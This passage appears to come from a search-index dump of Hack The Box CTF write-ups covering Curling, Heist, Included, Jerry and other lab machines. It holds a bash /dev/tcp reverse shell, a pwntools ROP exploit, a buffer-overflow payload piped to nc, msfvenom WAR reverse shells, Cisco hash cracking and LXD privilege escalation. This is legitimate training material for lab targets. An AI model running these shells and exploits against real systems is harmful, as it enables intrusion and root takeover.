000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 that is bunzip2 file, copy paste that strings to file cat password_backup_ori | xxd -r > password_backup.bz2 bunzip2 -k password_backup.bz2 # use -k to keep (don't delete) input files $ file password_backup password_backup: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141 $ mv password_backup password_backup.gz $ gunzip -k password_backup.gz $ file password_backup password_backup: bzip2 compressed data, block size = 900k $ mv password_backup password_backup.bz2 $ bunzip2 -k password_backup.bz2 $ file password_backup password_backup: POSIX tar archive (GNU) $ mv password_backup password_backup.tar $ tar xvf password_backup.tar $ cat password.txt 5d<wdCbdZu)|hChXll that is password for ssh $ ssh floris@10.129.95.228 floris@curling:~/admin-area$ cd /home/floris/admin-area floris@curling:~/admin-area$ cat input url = \"http://127.0.0.1\" floris@curling:~/admin-area$ cat report <..looks like when use curl http://127.0.0.1...> so by the power of luck, we try to change the input to url = \"file:///root/root.txt\" do that again floris@curling:~/admin-area$ echo 'url = \"file:///root/root.txt\"' > input floris@curling:~/admin-area$ cat input floris@curling:~/admin-area$ curl http://127.0.0.1 floris@curling:~/admin-area$ cat report it will print the report for /root/root.txt","title":"Curling"},{"location":"ctf/writeup/htb/htb-curling/#curling","text":"PHP Easy External Joomla Penetration Tester Level 1 Password Reuse CVE-2019-7304 Public Vulnerabilities CVE Exploitation Remote Code Execution $ nmap -sC -sV 10.129.95.228 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 07:22 WIB Nmap scan report for 10.129.95.228 Host is up (0.051s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.97 seconds when open the website, it shows that the website was built with joomla , the from the first post it shows that the post published 22 May 2018, so it should have been created with joomla 3.8.8 or 3.8.7 $ searchsploit joomla 3.8.8 ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results $ searchsploit joomla 3.8.7 ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results from searchsploit we know that it is CVE-2018-5263 when view page source some page there found secret.txt , so when i tried open it http://10.129.95.228/secret.txt , it shows Q3VybGluZzIwMTgh base64 of Curling2018! , also from the first post we know that the uploader is Floris use Floris : Curling2018! to login use gobuster to detect directory $ gobuster dir --url http://10.129.95.228/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.95.228/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/06/12 08:13:52 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 315] [--> http://10.129.95.228/images/] /media (Status: 301) [Size: 314] [--> http://10.129.95.228/media/] /templates (Status: 301) [Size: 318] [--> http://10.129.95.228/templates/] /modules (Status: 301) [Size: 316] [--> http://10.129.95.228/modules/] /bin (Status: 301) [Size: 312] [--> http://10.129.95.228/bin/] /plugins (Status: 301) [Size: 316] [--> http://10.129.95.228/plugins/] /includes (Status: 301) [Size: 317] [--> http://10.129.95.228/includes/] /language (Status: 301) [Size: 317] [--> http://10.129.95.228/language/] /components (Status: 301) [Size: 319] [--> http://10.129.95.228/components/] /cache (Status: 301) [Size: 314] [--> http://10.129.95.228/cache/] /libraries (Status: 301) [Size: 318] [--> http://10.129.95.228/libraries/] /tmp (Status: 301) [Size: 312] [--> http://10.129.95.228/tmp/] /layouts (Status: 301) [Size: 316] [--> http://10.129.95.228/layouts/] /administrator (Status: 301) [Size: 322] [--> http://10.129.95.228/administrator/] Progress: 14588 / 87665 (16.64%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/06/12 08:15:21 Finished =============================================================== open /administrator and login as Floris choose Extensions > Templates > Templates choose one up, i will choose protostar New File make name file, make sure that is php file. then create make simple php syntax, then save it $ curl http://10.129.95.228/templates/protostar/uptoyou.php uid=33(www-data) gid=33(www-data) groups=33(www-data) make reverse shell to make it easy $ nc -lnvp 443 <?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'\");?> $ curl http://10.129.95.228/templates/protostar/uptoyou.php from /home/floris/password_backup we got 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..<~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .>...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.\" 000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 that is bunzip2 file, copy paste that strings to file cat password_backup_ori | xxd -r > password_backup.bz2 bunzip2 -k password_backup.bz2 # use -k to keep (don't delete) input files $ file password_backup password_backup: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141 $ mv password_backup password_backup.gz $ gunzip -k password_backup.gz $ file password_backup password_backup: bzip2 compressed data, block size = 900k $ mv password_backup password_backup.bz2 $ bunzip2 -k password_backup.bz2 $ file password_backup password_backup: POSIX tar archive (GNU) $ mv password_backup password_backup.tar $ tar xvf password_backup.tar $ cat password.txt 5d<wdCbdZu)|hChXll that is password for ssh $ ssh floris@10.129.95.228 floris@curling:~/admin-area$ cd /home/floris/admin-area floris@curling:~/admin-area$ cat input url = \"http://127.0.0.1\" floris@curling:~/admin-area$ cat report <..looks like when use curl http://127.0.0.1...> so by the power of luck, we try to change the input to url = \"file:///root/root.txt\" do that again floris@curling:~/admin-area$ echo 'url = \"file:///root/root.txt\"' > input floris@curling:~/admin-area$ cat input floris@curling:~/admin-area$ curl http://127.0.0.1 floris@curling:~/admin-area$ cat report it will print the report for /root/root.txt","title":"Curling"},{"location":"ctf/writeup/htb/htb-dancing/","text":"Dancing \u00b6 Learn \u00b6 SMB (Server Message Block) \u00b6 communication protocol for providing shared access to files and printers between nodes on a network. Server Message Block provides file sharing, network browsing, printing, and inter-process communication (IPC) over a network. The SMB protocol relies on lower-level protocols for transport. The Microsoft SMB protocol was often used with NetBIOS over TCP/IP (NBT) over UDP, using port numbers 137 and 138, and TCP port numbers 137 and 139. Using the SMB protocol, an application (or the user of an application) can access files at a remote server, along with other resources such as printers. Thus, a client application can read, create, and update files on the remote server. An SMB-enabled storage on the network is called a share Requirement \u00b6 sudo apt update sudo apt -y install samba cifs-utils Pract \u00b6 nmap -sV <ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 13:05 WIB Nmap scan report for <ip> Host is up (0.35s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 738.24 seconds smbclient -L <ip_target> smbclient \\\\\\\\<ip_target>\\\\ADMIN$ smbclient \\\\\\\\<ip_target>\\\\WorkShares cd James.P get flag.txt","title":"Dancing"},{"location":"ctf/writeup/htb/htb-dancing/#dancing","text":"","title":"Dancing"},{"location":"ctf/writeup/htb/htb-dancing/#learn","text":"","title":"Learn"},{"location":"ctf/writeup/htb/htb-dancing/#smb-server-message-block","text":"communication protocol for providing shared access to files and printers between nodes on a network. Server Message Block provides file sharing, network browsing, printing, and inter-process communication (IPC) over a network. The SMB protocol relies on lower-level protocols for transport. The Microsoft SMB protocol was often used with NetBIOS over TCP/IP (NBT) over UDP, using port numbers 137 and 138, and TCP port numbers 137 and 139. Using the SMB protocol, an application (or the user of an application) can access files at a remote server, along with other resources such as printers. Thus, a client application can read, create, and update files on the remote server. An SMB-enabled storage on the network is called a share","title":"SMB (Server Message Block)"},{"location":"ctf/writeup/htb/htb-dancing/#requirement","text":"sudo apt update sudo apt -y install samba cifs-utils","title":"Requirement"},{"location":"ctf/writeup/htb/htb-dancing/#pract","text":"nmap -sV <ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 13:05 WIB Nmap scan report for <ip> Host is up (0.35s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 738.24 seconds smbclient -L <ip_target> smbclient \\\\\\\\<ip_target>\\\\ADMIN$ smbclient \\\\\\\\<ip_target>\\\\WorkShares cd James.P get flag.txt","title":"Pract"},{"location":"ctf/writeup/htb/htb-explosion/","text":"Explosion \u00b6 #Network #Account Misconfiguration sudo apt-get install freerdp2-x11 xfreerdp /u:Administrator /v:<ip_target>","title":"Explosion"},{"location":"ctf/writeup/htb/htb-explosion/#explosion","text":"#Network #Account Misconfiguration sudo apt-get install freerdp2-x11 xfreerdp /u:Administrator /v:<ip_target>","title":"Explosion"},{"location":"ctf/writeup/htb/htb-fawn/","text":"Fawn \u00b6 #nmap #21/tcp #telnet #metasploit sftp nmap -sV <ip> sudo apt install ftp ftp -h ftp <ip> anonymous anon123 help ls get flag.txt bye","title":"Fawn"},{"location":"ctf/writeup/htb/htb-fawn/#fawn","text":"#nmap #21/tcp #telnet #metasploit sftp nmap -sV <ip> sudo apt install ftp ftp -h ftp <ip> anonymous anon123 help ls get flag.txt bye","title":"Fawn"},{"location":"ctf/writeup/htb/htb-heist/","text":"Heist \u00b6 Easy External Enumeration IIS Penetration Tester Level 1 Password Cracking Authentication Weak Credentials User Enumeration Memory Dump $ nmap -sV -sC 10.129.132.228 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 10:27 WIB Nmap scan report for 10.129.132.228 Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s | smb2-time: | date: 2022-06-11T03:29:01 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 120.01 seconds http://10.129.132.228/attachments/config.txt , from the conversation we know that user hazard use cisco router version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0\u00c2 mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh after browsing with the keywork cisco crack password , I found https://www.ifm.net.nz/cookbooks/passwordcracker.html website to crack type 7 hash. Then I searched for crack type 5 and found https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html , but for cracking type 5 it takes a lot of time, so I looked for another solution, then I used john the ripper , and it worked $ echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash $ john -w=/path/to/rockyou.txt hash Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status stealth1agent (?) 1g 0:00:00:46 DONE (2022-06-11 12:12) 0.02150g/s 75371p/s 75371c/s 75371C/s stealthxxx..ste8897 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. so the password is hazard:stealth1agent # guessing rout3r:$uperP@ssword admin:Q4)sJu\\Y8qz*A3?d (not complete yet...) :D","title":"Heist"},{"location":"ctf/writeup/htb/htb-heist/#heist","text":"Easy External Enumeration IIS Penetration Tester Level 1 Password Cracking Authentication Weak Credentials User Enumeration Memory Dump $ nmap -sV -sC 10.129.132.228 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 10:27 WIB Nmap scan report for 10.129.132.228 Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s | smb2-time: | date: 2022-06-11T03:29:01 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 120.01 seconds http://10.129.132.228/attachments/config.txt , from the conversation we know that user hazard use cisco router version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0\u00c2 mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh after browsing with the keywork cisco crack password , I found https://www.ifm.net.nz/cookbooks/passwordcracker.html website to crack type 7 hash. Then I searched for crack type 5 and found https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html , but for cracking type 5 it takes a lot of time, so I looked for another solution, then I used john the ripper , and it worked $ echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash $ john -w=/path/to/rockyou.txt hash Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status stealth1agent (?) 1g 0:00:00:46 DONE (2022-06-11 12:12) 0.02150g/s 75371p/s 75371c/s 75371C/s stealthxxx..ste8897 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. so the password is hazard:stealth1agent # guessing rout3r:$uperP@ssword admin:Q4)sJu\\Y8qz*A3?d (not complete yet...) :D","title":"Heist"},{"location":"ctf/writeup/htb/htb-htb_console/","text":"HTB Console pwn Intro to Binary Exploitation htb-pwn HTB Console.zip hackthebox $ file htb-console htb-console: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=575e4055094a7f059c67032dd049e4fdbb171266, for GNU/Linux 3.2.0, stripped $ checksec --file=htb-console RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 3 htb-console int __fastcall sub_401201 ( const char * a1 ) { int result ; // eax char s ; // [rsp+10h] [rbp-10h] if ( ! strcmp ( a1 , \"id \\n \" ) ) return puts ( \"guest(1337) guest(1337) HTB(31337)\" ); if ( ! strcmp ( a1 , \"dir \\n \" ) ) return puts ( \"/home/HTB\" ); if ( ! strcmp ( a1 , \"flag \\n \" ) ) { printf ( \"Enter flag: \" ); fgets ( & s , 48 , stdin ); result = puts ( \"Whoops, wrong flag!\" ); } else if ( ! strcmp ( a1 , \"hof \\n \" ) ) { puts ( \"Register yourself for HTB Hall of Fame!\" ); printf ( \"Enter your name: \" ); fgets ( byte_4040B0 , 10 , stdin ); result = puts ( \"See you on HoF soon! :)\" ); } else if ( ! strcmp ( a1 , \"ls \\n \" ) ) { puts ( \"- Boxes\" ); puts ( \"- Challenges\" ); puts ( \"- Endgames\" ); puts ( \"- Fortress\" ); result = puts ( \"- Battlegrounds\" ); } else if ( ! strcmp ( a1 , \"date \\n \" ) ) { result = system ( \"date\" ); } else { result = puts ( \"Unrecognized command.\" ); } return result ; } from the code above we can get some information \"flag\" fgets(&s, 48, stdin); ... \"hof\" fgets(byte_4040B0, 10, stdin); ... \"date\" result = system(\"date\"); we need to know how system is called ... lea rdi, [...] # address that stores parameter, .bss \"/bin/sh\" call system you can learn about ROP Gadget from pwn import * HOST = \"159.65.92.13\" PORT = 31150 io = remote ( HOST , PORT ) # io = process('./htb-console') pop_rdi = 0x0401473 # pop rdi; ret bss_hof = 0x004040b0 # 0x401381 call 0x401040 <system@plt> system = 0x401040 # can use 0x401381 or 0x401040 io . recvuntil ( '>> ' ) io . sendline ( 'hof' ) payload = b '/bin/sh' io . recvuntil ( 'Enter your name: ' ) io . sendline ( payload ) io . recvuntil ( '>> ' ) io . sendline ( 'flag' ) payload = b 'a' * 24 payload += p64 ( pop_rdi ) payload += p64 ( bss_hof ) payload += p64 ( system ) io . recvuntil ( 'Enter flag: ' ) io . sendline ( payload ) io . interactive ()","title":"HTB Console"},{"location":"ctf/writeup/htb/htb-ignition/","text":"Ignition \u00b6 nmap -sV -sC <ip_target> curl -v <ip_target> echo \"<ip_target>\\tignition.htb\" | sudo tee -a /etc/hosts gobuster dir --url http://ignition.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt open http://ignition.htb/admin, and login as admin : qwerty123 (obtained from bruteforcing login, more eficient with burpsuite professional edition) flag is in Advanced Reporting","title":"Ignition"},{"location":"ctf/writeup/htb/htb-ignition/#ignition","text":"nmap -sV -sC <ip_target> curl -v <ip_target> echo \"<ip_target>\\tignition.htb\" | sudo tee -a /etc/hosts gobuster dir --url http://ignition.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt open http://ignition.htb/admin, and login as admin : qwerty123 (obtained from bruteforcing login, more eficient with burpsuite professional edition) flag is in Advanced Reporting","title":"Ignition"},{"location":"ctf/writeup/htb/htb-included/","text":"Included \u00b6 nmap -sV <target_ip> sudo nmap -sU --min-rate 5000 <target_ip> sudo nmap -p tftp --min-rate 5000 <target_ip> php-reverse-shell.php shell.php: change $ip and $port with yours $ tftp <target_ip> tftp> put shell.php tftp> quit nc -lvp 1234 then access uploaded file from LFI stored folder can be found from passwd or googling it The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default root directory where files will be stored is /var/lib/tftpboot curl \"http://<target_ip>/?file=/var/lib/tftpboot/shell.php\" just for convinience os use python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ls -al /var/www/html cat /var/www/html/.htpasswd $ su mike <password> Privilege \u00b6 LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform. A member of the local \u201clxd\u201d group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package. hacktricks Installing Go and other required package sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools git clone https://github.com/lxc/distrobuilder cd distrobuilder make Download the Alpine YAML mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 Once the build is done lxd.tar.xz and rootlet.squashfs will be available in the same folder run on the same folder python3 -m http.server 8000 go back on target system wget http://{local_IP}:8000/lxd.tar.xz wget http://{local_IP}:8000/rootfs.squashfs ls -la lxc image import lxd.tar.xz rootfs.squashfs --alias alpine lxc image list lxc init alpine privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh To access the root flag, we can navigate to the /mnt/root/root folder.","title":"Included"},{"location":"ctf/writeup/htb/htb-included/#included","text":"nmap -sV <target_ip> sudo nmap -sU --min-rate 5000 <target_ip> sudo nmap -p tftp --min-rate 5000 <target_ip> php-reverse-shell.php shell.php: change $ip and $port with yours $ tftp <target_ip> tftp> put shell.php tftp> quit nc -lvp 1234 then access uploaded file from LFI stored folder can be found from passwd or googling it The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default root directory where files will be stored is /var/lib/tftpboot curl \"http://<target_ip>/?file=/var/lib/tftpboot/shell.php\" just for convinience os use python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ls -al /var/www/html cat /var/www/html/.htpasswd $ su mike <password>","title":"Included"},{"location":"ctf/writeup/htb/htb-included/#privilege","text":"LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform. A member of the local \u201clxd\u201d group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package. hacktricks Installing Go and other required package sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools git clone https://github.com/lxc/distrobuilder cd distrobuilder make Download the Alpine YAML mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 Once the build is done lxd.tar.xz and rootlet.squashfs will be available in the same folder run on the same folder python3 -m http.server 8000 go back on target system wget http://{local_IP}:8000/lxd.tar.xz wget http://{local_IP}:8000/rootfs.squashfs ls -la lxc image import lxd.tar.xz rootfs.squashfs --alias alpine lxc image list lxc init alpine privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh To access the root flag, we can navigate to the /mnt/root/root folder.","title":"Privilege"},{"location":"ctf/writeup/htb/htb-jeeves/","text":"Jeeves pwn Intro to Binary Exploitation htb-pwn python2 Jeeves.zip hackthebox Solution \u00b6 python2 -c \"print 'a'*60+'\\xb3\\xba\\x37\\x13'\" | nc <target_ip> <port>","title":"Jeeves"},{"location":"ctf/writeup/htb/htb-jeeves/#solution","text":"python2 -c \"print 'a'*60+'\\xb3\\xba\\x37\\x13'\" | nc <target_ip> <port>","title":"Solution"},{"location":"ctf/writeup/htb/htb-jerry/","text":"Jerry \u00b6 Easy External Tomcat Java Penetration Tester Level 1 Remote Code Execution A05:2021-Security Misconfiguration Default Credentials Malicious WAR File Upload Looking Deeper \u00b6 $ nmap -sV -sC -Pn --min-rate 5000 10.129.136.9 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 19:41 EDT Nmap scan report for 10.129.136.9 Host is up (0.17s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.85 seconds go to http://10.129.136.9:8080/manager/html it will ask for auth, but you can get the auth easily then go to WAR file to deploy to try upload some file, it will ask to upload .war file Getting Some Information \u00b6 $ searchploit tomcat ... Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txt Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | jsp/webapps/42966.py ... it says that tomcat 7.0.88 has vuln at JSP Upload Bypass, then we need to make a bypass file to upload to the website you can check available payload to make a .war file $ msfconsole ... msf> search tomcat ... msf> use exploit/multi/http/tomcat_jsp_upload_bypass msf exploit(multi/http/tomcat_jsp_upload_bypass) > show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/generic/custom normal No Custom Payload 1 payload/generic/shell_bind_tcp normal No Generic Command Shell, Bind TCP Inline 2 payload/generic/shell_reverse_tcp normal No Generic Command Shell, Reverse TCP Inline 3 payload/generic/ssh/interact normal No Interact with Established SSH Connection 4 payload/java/jsp_shell_bind_tcp normal No Java JSP Command Shell, Bind TCP Inline 5 payload/java/jsp_shell_reverse_tcp normal No Java JSP Command Shell, Reverse TCP Inline we got the right payload java/jsp_shell_reverse_tcp make a payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f war > file_reverse.war send the file to the website at WAR file to deploy , then deploy it before running the uploaded file, you have to make a netcat connection to get feedback nc -nlvp 1234 then open the oploaded file and done, check your netcat listener","title":"Jerry"},{"location":"ctf/writeup/htb/htb-jerry/#jerry","text":"Easy External Tomcat Java Penetration Tester Level 1 Remote Code Execution A05:2021-Security Misconfiguration Default Credentials Malicious WAR File Upload","title":"Jerry"},{"location":"ctf/writeup/htb/htb-jerry/#looking-deeper","text":"$ nmap -sV -sC -Pn --min-rate 5000 10.129.136.9 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 19:41 EDT Nmap scan report for 10.129.136.9 Host is up (0.17s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.85 seconds go to http://10.129.136.9:8080/manager/html it will ask for auth, but you can get the auth easily then go to WAR file to deploy to try upload some file, it will ask to upload .war file","title":"Looking Deeper"},{"location":"ctf/writeup/htb/htb-jerry/#getting-some-information","text":"$ searchploit tomcat ... Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txt Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | 